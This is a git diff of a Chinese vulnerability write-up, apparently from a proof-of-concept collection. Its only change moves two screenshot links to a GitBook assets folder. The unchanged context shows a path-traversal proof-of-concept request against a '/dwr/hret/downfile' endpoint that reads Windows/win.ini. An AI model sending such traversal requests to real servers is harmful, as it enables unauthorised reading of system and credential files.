@@ -18,7 +18,7 @@
 
 登陆页面
 
-![image-20231115100316838](images/image-20231115100316838.png)
+![image-20231115100316838](../.gitbook/assets/image-20231115100316838.png)
 
 验证POC
 
@@ -28,4 +28,4 @@
 /dwr/hret/downfile?fpid=../../../../../../../../../Windows/win.ini 
 ```
 
-![image-20231115100630776](images/image-20231115100630776.png)
+![image-20231115100630776](../.gitbook/assets/image-20231115100630776.png)
